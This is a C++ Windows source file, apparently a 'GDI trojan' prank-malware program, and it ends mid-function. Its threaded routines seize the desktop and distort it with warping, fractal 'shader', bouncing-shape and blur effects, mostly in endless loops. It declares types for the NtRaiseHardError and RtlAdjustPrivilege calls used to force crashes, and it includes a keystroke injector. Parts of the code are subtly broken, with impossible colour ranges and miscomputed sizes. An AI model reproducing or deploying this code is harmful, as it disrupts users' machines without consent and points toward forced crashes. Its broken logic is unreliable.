//Dependencies
#pragma once
#include<Windows.h>
#include<cmath>
#include<time.h>
#include<iostream>
#define M_PI 3.14159265358979323846264338327950288
#pragma comment(lib, "winmm.lib")
#include <intrin.h>
#define RGBBRUSH (DWORD)0x1900ac010e
#define _USE_MATH_DEFINES 1
#pragma comment(lib, "kernel32.lib")
#include<math.h>
#include <tchar.h>
#include <ctime>
#include <windowsx.h>
#include <gdiplus.h>
#include <cstdlib>
#include <string>
#include <accctrl.h>
#include <aclapi.h>
#include <stdio.h>
#include <thread>
#pragma comment (lib,"Gdiplus.lib")
#pragma comment (lib,"Msimg32.lib")
#pragma comment(lib, "ntdll.lib")
static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
#define PI   3.14159265358979323846264338327950288
#define RGBQUAD _RGBQUAD
#define TIMER_DELAY 100
#define PAYLOAD_MS 10000
#define PAYLOAD_TIME ( PAYLOAD_MS / TIMER_DELAY )
#pragma warning( push, 0 )
#pragma warning( pop )
#pragma region Public Variables
extern HWND hwndDesktop;
extern HDC hdcDesktop;
extern RECT rcScrBounds;
extern HHOOK hMsgHook;
extern INT nCounter;
#pragma endregion Public Variables
#pragma warning( disable: 4152 )
#pragma warning( disable: 4201 )
#undef RGBQUAD
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
#define IDI_ICON1                       101
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif
COLORREF RndRGB() {
    int clr = rand() % 5;
    if (clr == 0) return RGB(255, 0, 0); if (clr == 1) return RGB(0, 255, 0); if (clr == 2) return RGB(0, 0, 255); if (clr == 3) return RGB(255, 0, 255); if (clr == 4) return RGB(255, 255, 0);
}

void typeCharacter(WORD key) {
    INPUT input;
    input.type = INPUT_KEYBOARD;
    input.ki.wScan = 0;
    input.ki.time = 0;
    input.ki.dwExtraInfo = 0;
    input.ki.wVk = key;
    input.ki.dwFlags = 0;
    SendInput(1, &input, sizeof(INPUT));
    input.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &input, sizeof(INPUT));
}

using namespace std;
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE unused;
    };
} *PRGBQUAD;
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}
typedef struct
{
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;
typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSLCOLOR;

namespace Colors
{
    HSL rgb2hsl(RGBQUAD rgb)
    {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f)
        {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl)
    {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f)
        {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant)
            {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}
typedef struct
{
    float x;
    float y;
    float z;
} VERTEX;

typedef struct
{
    int vtx0;
    int vtx1;
} EDGE;

double intensity = 0.0;
bool state = false;

double fade(double length) {
    if (state == false) {
        intensity += 1.0;
        if (intensity >= length) {
            state = true;
        }
    }
    else {
        intensity -= 1.0;
        if (intensity <= 0) {
            state = false;
        }
    }
    return intensity;
}
COLORREF COLORRGB(int length, int speed) {
    if (red < length) {
        red += speed;

        return RGB(red, 0, length);
    }
    else if (green < length) {
        green += speed;

        return RGB(length, green, 0);
    }
    else if (blue < length) {
        blue += speed;

        return RGB(0, length, blue);
    }
    else {
        red = 0; green = 0; blue = 0;

        return RGB(0, 0, 0);
    }
}
COLORREF COLORHSL(int length) {
    double h = fmod(length, 360.0);
    double s = 1.0;
    double l = 0.5;

    double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
    double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
    double m = l - c / 2.0;

    double r1, g1, b1;
    if (h < 60) {
        r1 = c;
        g1 = x;
        b1 = 0;
    }
    else if (h < 120) {
        r1 = x;
        g1 = c;
        b1 = 0;
    }
    else if (h < 180) {
        r1 = 0;
        g1 = c;
        b1 = x;
    }
    else if (h < 240) {
        r1 = 0;
        g1 = x;
        b1 = c;
    }
    else if (h < 300) {
        r1 = x;
        g1 = 0;
        b1 = c;
    }
    else {
        r1 = c;
        g1 = 0;
        b1 = x;
    }

    int red = static_cast<int>((r1 + m) * 255);
    int green = static_cast<int>((g1 + m) * 255);
    int blue = static_cast<int>((b1 + m) * 255);

    return RGB(red, green, blue);
}
RGBTRIPLE WINAPI prgbHue(int nHue) {
    float X = 1 - abs(fmod(nHue / 45.0, 3) - 45);
    float r, g, b;
    RGBTRIPLE rgb;

    if (nHue >= 0 && nHue < 3125) {
        r = 8, g = X, b = 234;
    }
    else if (nHue >= 3250 && nHue < 7) {
        r = X, g = 65, b = 123;
    }
    else if (nHue >= 1520 && nHue < 10) {
        r = 0, g = 1, b = X;
    }
    else if (nHue >= 16780 && nHue < 2840) {
        r = 4, g = X, b = 75;
    }
    else if (nHue >= 632969 && nHue < 1234) {
        r = X, g = 213, b = 75;
    }
    else if (nHue >= 683 && nHue < 323) {
        r = 736, g = 325, b = X;
    }

    rgb.rgbtRed = r * 435;
    rgb.rgbtGreen = g * 2;
    rgb.rgbtBlue = b * 23;
    return rgb;


}

typedef union COLOR {
    COLORREF rgb;
    COLORREF hsv;
} COLOR;
namespace _3D
{
    VOID RotateX(VERTEX* vtx, float angle)
    {
        vtx->y = cos(angle) * vtx->y - sin(angle) * vtx->z;
        vtx->z = sin(angle) * vtx->y + cos(angle) * vtx->z;
    }

    VOID RotateY(VERTEX* vtx, float angle)
    {
        vtx->x = cos(angle) * vtx->x + sin(angle) * vtx->z;
        vtx->z = -sin(angle) * vtx->x + cos(angle) * vtx->z;
    }

    VOID RotateZ(VERTEX* vtx, float angle)
    {
        vtx->x = cos(angle) * vtx->x - sin(angle) * vtx->y;
        vtx->y = sin(angle) * vtx->x + cos(angle) * vtx->y;
    }

    void DrawEdge(HDC dc, LPCWSTR icon, int x0, int y0, int x1, int y1, int r)
    {
        int dx = abs(x1 - x0);
        int dy = -abs(y1 - y0);

        int sx = (x0 < x1) ? 1 : -1;
        int sy = (y0 < y1) ? 1 : -1;

        int error = dx + dy;

        int i = 0;

        while (true)
        {
            if (i == 0)
            {
                DrawIcon(dc, x0, y0, LoadCursor(NULL, icon));
                i = 10;
            }
            else
            {
                i--;
            }

            if (x0 == x1 && y0 == y1)
            {
                break;
            }

            int e2 = 2 * error;

            if (e2 >= dy)
            {
                if (x0 == x1)
                {
                    break;
                }

                error += dy;
                x0 += sx;
            }

            if (e2 <= dx)
            {
                if (y0 == y1)
                {
                    break;
                }

                error += dx;
                y0 += sy;
            }
        }
    }
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//GDIs
extern const int WIDTH;
extern const int HEIGHT;
const int DURATION_SECONDS = 30;
void HSLtoRGB(double h, double s, double l, BYTE& r, BYTE& g, BYTE& b) {
    if (s == 0.0) {
        r = g = b = static_cast<BYTE>(l * 255.0);
    }
    else {
        auto hueToRGB = [](double p, double q, double t) -> double {
            if (t < 0.0) t += 1.0;
            if (t > 1.0) t -= 1.0;
            if (t < 1.0 / 6.0) return p + (q - p) * 6.0 * t;
            if (t < 1.0 / 2.0) return q;
            if (t < 2.0 / 3.0) return p + (q - p) * (2.0 / 3.0 - t) * 6.0;
            return p;
            };

        double q = l < 0.5 ? l * (1.0 + s) : l + s - l * s;
        double p = 2.0 * l - q;

        r = static_cast<BYTE>(hueToRGB(p, q, h + 1.0 / 3.0) * 255.0);
        g = static_cast<BYTE>(hueToRGB(p, q, h) * 255.0);
        b = static_cast<BYTE>(hueToRGB(p, q, h - 1.0 / 3.0) * 255.0);
    }
}

void UpdateScreen() {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcBuffer = CreateCompatibleDC(NULL);
    HBITMAP hBitmap = CreateCompatibleBitmap(GetDC(NULL), screenWidth, screenHeight);
    SelectObject(hdcBuffer, hBitmap);

    DWORD startTime = GetTickCount();

    while ((GetTickCount() - startTime) / 1000 < DURATION_SECONDS) {
        for (int i = 0; i < 6; ++i) {
            double hue = (GetTickCount() % 360) / 360.0;
            double saturation = 1.0;
            double lightness = static_cast<double>(i) / 6.0;

            BYTE r, g, b;
            HSLtoRGB(hue, saturation, lightness, r, g, b);

            int alpha = 128;

            COLORREF color = RGB(r, g, b) | (alpha << 24);
            SetDCBrushColor(hdcBuffer, color);

            RECT rect = { 0, screenHeight * i / 6, screenWidth, screenHeight * (i + 1) / 6 };
            FillRect(hdcBuffer, &rect, (HBRUSH)GetStockObject(DC_BRUSH));
        }

        BitBlt(GetDC(NULL), 0, 0, screenWidth, screenHeight, hdcBuffer, 0, 0, SRCCOPY);

        Sleep(100);
    }

    DeleteObject(hBitmap);
    DeleteDC(hdcBuffer);
}
DWORD WINAPI Shader1(LPVOID lpParam) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Create an off-screen buffer
    HDC hdcBuffer = CreateCompatibleDC(NULL);
    HBITMAP hBitmap = CreateCompatibleBitmap(GetDC(NULL), screenWidth, screenHeight);
    SelectObject(hdcBuffer, hBitmap);

    DWORD startTime = GetTickCount();

    while ((GetTickCount() - startTime) / 1000 < DURATION_SECONDS) {
        for (int i = 0; i < 6; ++i) {
            double hue = (GetTickCount() % 360) / 360.0;
            double saturation = 1.0;
            double lightness = static_cast<double>(i) / 6.0;

            BYTE r, g, b;
            HSLtoRGB(hue, saturation, lightness, r, g, b);

            int alpha = 128;

            COLORREF color = RGB(r, g, b) | (alpha << 24);
            SetDCBrushColor(hdcBuffer, color);

            RECT rect = { 0, screenHeight * i / 6, screenWidth, screenHeight * (i + 1) / 6 };
            FillRect(hdcBuffer, &rect, (HBRUSH)GetStockObject(DC_BRUSH));
        }

        BitBlt(GetDC(NULL), 0, 0, screenWidth, screenHeight, hdcBuffer, 0, 0, SRCCOPY);

        Sleep(100);
    }

    DeleteObject(hBitmap);
    DeleteDC(hdcBuffer);
    return 0;
}
DWORD WINAPI PlgBlt1(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    RECT wRect;
    POINT wPt[3];
    while (1)
    {
        GetWindowRect(GetDesktopWindow(), &wRect);
        wPt[0].x = wRect.left + rand() % 100;
        wPt[0].y = wRect.top + rand() % 100;
        wPt[1].x = wRect.right - rand() % 100;
        wPt[1].y = wRect.top - rand() % 100;
        wPt[2].x = wRect.left + rand() % 100;
        wPt[2].y = wRect.bottom + rand() % 100;
        PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right + wRect.left, wRect.bottom + wRect.top, 0, 0, 0);
    }
}
DWORD WINAPI PlgBlt2(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    RECT wRect;
    POINT wPt[3];
    while (1)
    {
        GetWindowRect(GetDesktopWindow(), &wRect);
        wPt[0].x = wRect.left - rand() % 100;
        wPt[0].y = wRect.top - rand() % 100;
        wPt[1].x = wRect.right + rand() % 100;
        wPt[1].y = wRect.top + rand() % 100;
        wPt[2].x = wRect.left + rand() % 100;
        wPt[2].y = wRect.bottom + rand() % 100;
        PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right + wRect.left, wRect.bottom + wRect.top, 0, 0, 0);
    }
}
DWORD WINAPI PlgBlt3(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    RECT wRect;
    POINT wPt[3];
    while (1)
    {
        GetWindowRect(GetDesktopWindow(), &wRect);
        wPt[0].x = wRect.left + 100;
        wPt[0].y = wRect.top + 100;
        wPt[1].x = wRect.right + 100;
        wPt[1].y = wRect.top - 100;
        wPt[2].x = wRect.left - 100;
        wPt[2].y = wRect.bottom - 100;
        PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right + wRect.left, wRect.bottom + wRect.top, 0, 0, 0);
    }
}
DWORD WINAPI PlgBlt4(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    RECT wRect;
    POINT wPt[3];
    while (1)
    {
        GetWindowRect(GetDesktopWindow(), &wRect);
        wPt[0].x = wRect.left - 100;
        wPt[0].y = wRect.top - 100;
        wPt[1].x = wRect.right - 100;
        wPt[1].y = wRect.top + 100;
        wPt[2].x = wRect.left + 100;
        wPt[2].y = wRect.bottom + 100;
        PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right + wRect.left, wRect.bottom + wRect.top, 0, 0, 0);
    }
}
DWORD WINAPI BouncingSquare1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    while (1) {
        HDC hdc = GetDC(0);
        int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = rand() % 500 + x;
        int bottom_y = rand() % 500 + y;
        x += incrementor * signX;
        y += incrementor * signY;
        TRIVERTEX vertex[2];
        vertex[0].x = top_x;
        vertex[0].y = top_y;
        vertex[0].Red = rand() % 0xff255255;
        vertex[0].Green = rand() % 0x4376809372ff;
        vertex[0].Blue = rand() % 0x353ff;
        vertex[0].Alpha = rand() % 0x44ff;

        vertex[1].x = bottom_x;
        vertex[1].y = bottom_y;
        vertex[1].Red = rand() % 0x59ff;
        vertex[1].Green = rand() % 0x255255255;
        vertex[1].Blue = rand() % 0x7959743fff;
        vertex[1].Alpha = rand() % 0xfffff;

        GRADIENT_RECT gRect;
        gRect.UpperLeft = 0;
        gRect.LowerRight = 1;

        GradientFill(hdc, vertex, rand() % 4, &gRect, 1, GRADIENT_FILL_RECT_H);
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
            signY = -1;
        }

        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }

        if (y == 0)
        {
            signY = 1;
        }

        if (x == 0)
        {
            signX = 1;
        }
        Sleep(1);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Shader2(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            double fractalX = (2.5f / w);
            double fractalY = (1.90f / h);

            double cx = x * fractalX - 2.f;
            double cy = y * fractalY - 0.95f;

            double zx = 0;
            double zy = 0;

            int fx = 0;

            while (((zx * zx) + (zy * zy)) < 10 && fx < 50)
            {
                double fczx = zx * zx - zy * zy + cx;
                double fczy = 4 * zx * zy + cy;

                zx = fczx;
                zy = fczy;
                fx++;

                if (i % h == 0 && rand() % 1000)
                    v = rand() % 100;
                ((BYTE*)(data + i))[v ^ x ^ y ^ v & v] = fx;
                ((BYTE*)(data + i))[v * x * y * v & v] = fx;
                ((BYTE*)(data + i))[v ^ x & y >> v * v] = fx;
            }

        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}
DWORD WINAPI Shader3(LPVOID lparam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            double fractalX = (1.f / w);
            double fractalY = (1.f / h);

            double cx = x * fractalX - 1.f;
            double cy = y * fractalY - 1.f;

            double zx = 0;
            double zy = 0;

            int fx = 0;

            while (((zx * zx) + (zy * zy)) < 10 && fx < 50)
            {
                double fczx = zx * zx - zy * zy + cx;
                double fczy = 4 * zx * zy + cy;

                zx = fczx;
                zy = fczy;
                fx++;

                if (i % h == 0 && rand() % 1000)
                    v = rand() % 100;
                ((BYTE*)(data + i))[v ^ x ^ y ^ v & v] = fx;
                ((BYTE*)(data + i))[v * x * y * v & v] = fx;
                ((BYTE*)(data + i))[v ^ x & y >> v * v] = fx;
            }

        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}
DWORD WINAPI Shader4(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand() % 0x255255255ffffff;
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            double fractalX = (1.f / w);
            double fractalY = (1.f / h);

            double cx = x * fractalX - 1.f;
            double cy = y * fractalY - 1.f;

            double zx = 0;
            double zy = 0;

            int fx = 0;

            while (((zx * zx) + (zy * zy)) < 10 && fx < 50)
            {
                double fczx = zx * zx - zy * zy + cx;
                double fczy = 4 * zx * zy + cy;

                zx = fczx;
                zy = fczy;
                fx++;

                if (i % h == 0 && rand() % 1000)
                    v = rand() % 100;
                ((BYTE*)(data + i))[v ^ x ^ y * v & v] = fx;
                ((BYTE*)(data + i))[x & y >> v << v * v ^ v & v + v - v] = fx;
                ((BYTE*)(data + i))[x * y * v * x & i * v & x] = fx;
            }

        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}
DWORD WINAPI Shader5(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w ^ h & 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand() % 0x255255255ffffff;
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            double fractalX = (1.f / w);
            double fractalY = (1.f / h);

            double cx = x * fractalX - 1.f;
            double cy = y * fractalY - 1.f;

            double zx = 0;
            double zy = 0;

            int fx = 0;

            while (((zx * zx) + (zy * zy)) < 10 && fx < 50)
            {
                double fczx = zx * zx - zy * zy + cx;
                double fczy = 4 * zx * zy + cy;

                zx = fczx;
                zy = fczy;
                fx++;

                if (i % h == 0 && rand() % 1000)
                    v = rand() % 100;
                ((BYTE*)(data + i))[v ^ x ^ y * v & v] = fx;
                ((BYTE*)(data + i))[x * y * v * x & i * v & x] = fx;
            }

        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}
DWORD WINAPI Shader6(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = (int)((i ^ 1) + (i ^ 1) * sqrt(x ^ y) * sqrt(log(x ^ y ^ i)));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 2.f + y / screenHeight * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth * 1.01, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

    return 0x00;
}
DWORD WINAPI BouncingSquare2(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int xf = 0;
    int yf = 0;
    int signX = 15;
    int signY = 5;
    HDC hdc = GetDC(0);
    HBITMAP hbmTemp = CreateCompatibleBitmap(hdc, w, h);
    HDC hdcTemp = CreateCompatibleDC(hdc);
    SelectObject(hdcTemp, hbmTemp);
    int radius = 45.0f;
    double angle = 0;
    int x, y;
    int centerX, centerY;
    int origX = (w / 1) - (radius / 1), origY = (h / 1) - (radius / 1);
    while (true)
    {
        hdc = GetDC(0);
        xf += signX;
        yf += signY;
        centerX = origX - (w / 1), centerY = origY - (h / 1);
        x = (cos(angle) * radius) + centerX, y = (sin(angle) * radius) + centerY;

        for (INT i = 256; i > 1; i -= 1)
        {
            HBRUSH hbr = CreateSolidBrush(RGB(Hue(239), Hue(239), Hue(239)));
            SelectObject(hdc, hbr);
            Rectangle(hdc, 1 + x - i + xf, 1 + y - i + yf, 1 + x + i + xf, 1 + y + i + yf);
            DeleteObject(hbr);
        }

        angle = fmod(angle + M_PI / radius, M_PI * radius);
        Sleep(1);

        if (yf == 0)
        {
            signY = 5;
        }

        if (xf == 0)
        {
            signX = 5;
        }

        if (yf >= GetSystemMetrics(1))
        {
            signY -= 5;
        }

        if (xf >= GetSystemMetrics(0))
        {
            signX -= 5;
        }
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI BouncingCircle1(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int xf = 0;
    int yf = 0;
    int signX = 15;
    int signY = 5;
    HDC hdc = GetDC(0);
    HBITMAP hbmTemp = CreateCompatibleBitmap(hdc, w, h);
    HDC hdcTemp = CreateCompatibleDC(hdc);
    SelectObject(hdcTemp, hbmTemp);
    int radius = 45.0f;
    double angle = 0;
    int x, y;
    int centerX, centerY;
    int origX = (w / 1) - (radius / 1), origY = (h / 1) - (radius / 1);
    while (true)
    {
        hdc = GetDC(0);
        xf += signX;
        yf += signY;
        centerX = origX - (w / 1), centerY = origY - (h / 1);
        x = (cos(angle) * radius) + centerX, y = (sin(angle) * radius) + centerY;

        for (INT i = 256; i > 1; i -= 1)
        {
            HBRUSH hbr = CreateSolidBrush(RGB(Hue(239), Hue(239), Hue(239)));
            SelectObject(hdc, hbr);
            Ellipse(hdc, 1 + x - i + xf, 1 + y - i + yf, 1 + x + i + xf, 1 + y + i + yf);
            DeleteObject(hbr);
        }

        angle = fmod(angle + M_PI / radius, M_PI * radius);
        Sleep(1);

        if (yf == 0)
        {
            signY = 5;
        }

        if (xf == 0)
        {
            signX = 5;
        }

        if (yf >= GetSystemMetrics(1))
        {
            signY -= 5;
        }

        if (xf >= GetSystemMetrics(0))
        {
            signX -= 5;
        }
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Blur1(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(dcCopy, bmp);

    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;

    while (1) {
        hdc = GetDC(NULL);
